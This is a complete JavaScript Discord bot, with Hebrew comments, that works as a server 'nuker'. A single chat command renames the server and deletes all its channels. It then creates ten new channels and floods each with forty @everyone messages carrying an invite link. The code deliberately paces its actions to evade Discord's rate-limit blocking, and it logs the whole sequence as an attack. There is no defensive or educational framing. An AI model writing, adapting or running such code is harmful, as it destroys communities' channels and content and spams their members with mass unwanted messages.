const { Client, GatewayIntentBits } = require('discord.js');
const fs = require('fs').promises;
const path = require('path');

async function loadConfig() {
    const configPath = path.join(__dirname, 'config.json');
    const configData = await fs.readFile(configPath, 'utf-8');
    return JSON.parse(configData);
}

// פונקציית עזר קטנה ליצירת הפסקה קצרה כדי שדיסקורד לא יחסמו את הבוט
const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

async function main() {
    const config = await loadConfig();
    
    // משיכת הטוקן בצורה סודית מהאתר רנדר
    const botToken = config.token === "PROCESS_ENV_TOKEN" ? process.env.DISCORD_TOKEN : config.token;

    const client = new Client({
        intents: [
            GatewayIntentBits.Guilds,
            GatewayIntentBits.GuildMessages,
            GatewayIntentBits.MessageContent
        ]
    });

    client.once('ready', () => { 
        console.log(`Logged in as ${client.user.tag}!`); 
    });

    client.on('messageCreate', async message => {
        if (!message.content.startsWith('!') || message.author.bot) return;
        const args = message.content.slice(1).trim().split(/ +/);
        const command = args.shift().toLowerCase();

        if (command === 'זניט') {
            console.log('Safe & Fast attack started!');
            
            // 1. שינוי שם השרת
            message.guild.setName(config.newServerName).catch(console.error);
            
            // 2. מחיקת החדרים הקיימים - אחד אחרי השני בצורה מהירה
            const channels = await message.guild.channels.fetch();
            for (const channel of channels.values()) { 
                await channel.delete().catch(console.error); 
                await sleep(100); // הפסקה קטנה של עשירית שנייה
            }

            // 3. יצירת 10 חדרים חדשים
            const validChannels = [];
            for (let i = 0; i < 10; i++) {
                const created = await message.guild.channels.create({ 
                    name: 'כנסו-עברנו-שרת', 
                    type: 0 
                }).catch(console.error);
                if (created) {
                    validChannels.push(created);
                }
                await sleep(100); // הפסקה קטנה בין יצירת חדרים
            }

            // 4. שליחת הודעות ספאם עם הפסקות חכמות כדי למנוע חסימה
            for (const channel of validChannels) {
                for (let i = 0; i < 40; i++) {
                    await channel.send('@everyone כנסו עברנו שרת https://discord.gg').catch(console.error);
                    await sleep(150); // הפסקה קצרה בין הודעה להודעה כדי שדיסקורד לא יקפיאו את הבוט
                }
            }
            console.log('Attack finished successfully!');
        }
    });

    client.login(botToken);
}

main().catch(console.error);
